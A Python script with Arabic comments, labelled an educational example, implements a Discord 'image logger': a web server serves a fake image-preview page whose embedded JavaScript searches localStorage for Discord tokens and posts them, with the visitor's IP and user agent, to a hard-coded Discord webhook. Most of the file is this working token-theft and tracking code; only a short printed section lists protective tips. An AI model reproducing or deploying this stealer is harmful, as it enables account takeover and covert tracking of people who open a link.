"""
🎯 مثال تعليمي: كيف يبدو هجوم حقيقي يجمع بين الصور وويبهوك ديسكورد
🔍 هذا للتعرف على الأنماط الخبيثة فقط
"""

import base64
import requests
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class MaliciousImageServer:
    """
    خادم ويب ضار يقدم صورة بريئة
    لكنه يسرق المعلومات في الخلفية
    """
    
    def __init__(self, webhook_url: str, image_url: str = None):
        self.webhook_url = webhook_url or "https://discord.com/api/webhooks/1446573695349821572/y1vKKbHqFxLmZh9M38D3e0udtipqCF65kVdKRfa17-tAJWN6gteCuU4S3Z2M5b3XDXWv"
        self.image_url = image_url or "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRoFwupjWasV1-97GYm7qVIkrvfZrBLE1lzLg&s"
        self.stolen_data = []
        
    def create_fake_image_page(self, ip_address: str, user_agent: str) -> str:
        """
        إنشاء صفحة ويب تظهر صورة
        ولكنها تجمع معلومات المستخدم
        """
        
        # كود JavaScript لسرقة التوكن إذا كان في localStorage
        steal_script = """
        <script>
        // محاولة سرقة التوكن من localStorage
        setTimeout(function() {
            var tokens = [];
            
            // البحث عن أي بيانات تشبه توكن ديسكورد
            for(var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                var value = localStorage.getItem(key);
                
                // نمط توكن ديسكورد: 24.6.27 أو mfa.84
                if(value && value.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}/)) {
                    tokens.push(value);
                }
            }
            
            // إرسال البيانات إذا وجدت
            if(tokens.length > 0) {
                fetch('%s', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ip: '%s',
                        userAgent: '%s',
                        tokens: tokens,
                        source: 'Image Logger'
                    })
                });
            }
        }, 2000);
        </script>
        """ % (self.webhook_url, ip_address, user_agent)
        
        # صفحة HTML تبدو كصورة عادية
        html_page = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Image Preview</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #36393f;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }}
                .image-container {{
                    max-width: 90%;
                    max-height: 90%;
                }}
                img {{
                    width: 100%;
                    height: auto;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.3);
                }}
                .loading {{
                    color: white;
                    font-family: Arial;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="image-container">
                <img src="{self.image_url}" alt="Image" 
                     onload="document.getElementById('loading').style.display='none'">
                <div class="loading" id="loading">Loading image...</div>
            </div>
            {steal_script}
        </body>
        </html>
        """
        
        return html_page
    
    def send_to_discord_webhook(self, data: dict) -> None:
        """
        إرسال البيانات المسروقة إلى ويبهوك ديسكورد
        مع تضمين صورة في الإيمبد
        """
        
        embed = {
            "title": "🕵️‍♂️ Image Logger Report",
            "description": "New victim opened the image",
            "color": 0xff0000,
            "thumbnail": {
                "url": self.image_url
            },
            "fields": [
                {
                    "name": "🌐 IP Address",
                    "value": f"`{data.get('ip', 'Unknown')}`",
                    "inline": True
                },
                {
                    "name": "🖥️ User Agent",
                    "value": f"```{data.get('userAgent', 'Unknown')[:100]}...```",
                    "inline": False
                },
                {
                    "name": "🔑 Tokens Found",
                    "value": str(len(data.get('tokens', []))),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Image Logger Example - Educational Purposes Only",
                "icon_url": self.image_url
            },
            "timestamp": data.get('timestamp')
        }
        
        # إذا وجد توكن، إظهار أول واحد (مقصوص)
        if data.get('tokens'):
            token_preview = data['tokens'][0][:30] + "..."
            embed["fields"].append({
                "name": "📝 Token Preview",
                "value": f"`{token_preview}`",
                "inline": False
            })
        
        payload = {
            "username": "Image Logger Bot",
            "avatar_url": self.image_url,
            "embeds": [embed],
            "content": "@here" if data.get('tokens') else ""
        }
        
        try:
            response = requests.post(
                self.webhook_url,
                json=payload,
                headers={'Content-Type': 'application/json'}
            )
            print(f"✅ Sent to webhook: {response.status_code}")
        except Exception as e:
            print(f"❌ Error: {e}")

class ImageLoggerHandler(BaseHTTPRequestHandler):
    """
    معالج طلبات HTTP يقدم الصورة
    ويسجل معلومات المستخدم
    """
    
    def do_GET(self):
        try:
            # الحصول على معلومات المستخدم
            ip = self.headers.get('X-Forwarded-For') or self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # تحليل الاستعلامات
            query = urlparse(self.path).query
            params = parse_qs(query)
            
            # تحديد رابط الصورة
            image_url = params.get('img', [None])[0]
            if not image_url:
                image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRoFwupjWasV1-97GYm7qVIkrvfZrBLE1lzLg&s"
            
            # إنشاء خادم وهمي
            server = MaliciousImageServer(
                webhook_url="https://discord.com/api/webhooks/1446573695349821572/y1vKKbHqFxLmZh9M38D3e0udtipqCF65kVdKRfa17-tAJWN6gteCuU4S3Z2M5b3XDXWv",
                image_url=image_url
            )
            
            # إنشاء الصفحة
            html_content = server.create_fake_image_page(ip, user_agent)
            
            # إرسال الرد
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            # إرسال البيانات إلى الديسكورد
            data = {
                "ip": ip,
                "userAgent": user_agent,
                "tokens": [],  # سيتم ملؤها بالجافاسكريبت
                "timestamp": json.dumps({"$date": {"$numberLong": str(int(time.time() * 1000))}})
            }
            
            server.send_to_discord_webhook(data)
            
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {str(e)}")

def create_educational_example():
    """
    مثال تعليمي يوضح كيف يتم تنفيذ الهجوم
    """
    
    print("""
    ⚠️  كيف يعمل هجوم Image Logger:
    
    1. المهاجم ينشئ رابط صورة (مثل: https://evil.com/image.png)
    2. الضغط تفتح الرابط، تظهر الصورة بشكل طبيعي
    3. في الخلفية، يتم تنفيذ JavaScript لسرقة:
       - IP Address
       - User Agent
       - Discord Token (إذا موجود في localStorage)
    4. البيانات تُرسل تلقائياً إلى ويبهوك الديسكورد
    
    🔒 كيفية الحماية:
    1. لا تفتح روابط صور من مصادر غير موثوقة
    2. استخدم NoScript أو ad-blocker
    3. لا تخزن توكن في localStorage
    4. تأكد من أن الروابط من مصادر موثوقة
    """)
    
    # مثال على البيانات التي تُرسل
    example_data = {
        "webhook_payload": {
            "username": "Fake Image Bot",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
            "content": "@here New victim!",
            "embeds": [{
                "title": "📸 Image Opened",
                "description": "Victim opened malicious image",
                "color": 0x5865F2,
                "fields": [
                    {"name": "IP", "value": "123.456.789.012", "inline": True},
                    {"name": "Browser", "value": "Chrome 120.0", "inline": True}
                ],
                "image": {"url": "https://i.imgur.com/malicious-image.png"}
            }]
        }
    }
    
    print("📋 مثال على البيانات المُرحلة:")
    print(json.dumps(example_data, indent=2))

# تشغيل المثال التعليمي
if __name__ == "__main__":
    import time
    
    create_educational_example()
    
    print("\n" + "="*50)
    print("هذا مثال تعليمي للتعرف على الهجمات")
    print("لا تستخدم هذه التقنيات لأغراض ضارة")
    print("="*50)
